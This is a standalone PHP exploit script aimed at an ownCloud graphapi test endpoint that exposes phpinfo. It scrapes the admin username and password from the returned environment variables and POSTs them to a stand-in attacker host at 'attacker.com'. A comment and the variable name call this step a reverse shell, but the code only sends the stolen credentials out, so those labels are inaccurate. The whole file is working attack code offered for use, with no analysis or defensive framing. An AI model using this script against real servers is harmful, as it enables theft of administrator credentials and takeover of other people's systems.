<?php

$target = 'http://victim.com/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/.css';
$reverse_shell = 'http://attacker.com/shell.php'; 

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $target);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec($ch);
curl_close($ch);

// Extract sensitive information from the phpinfo output
preg_match_all('/<tr><td class="e">(.*?)<\/td><td class="v">(.*?)<\/td><\/tr>/', $response, $matches);
$env_vars = array_combine($matches[1], $matches[2]);

// Set up a reverse shell connection
$admin_user = $env_vars['OWNCLOUD_ADMIN_USERNAME'];
$admin_pass = $env_vars['OWNCLOUD_ADMIN_PASSWORD'];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $reverse_shell);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array(
    'username' => $admin_user,
    'password' => $admin_pass
)));
$response = curl_exec($ch);
curl_close($ch);

echo $response;
?>
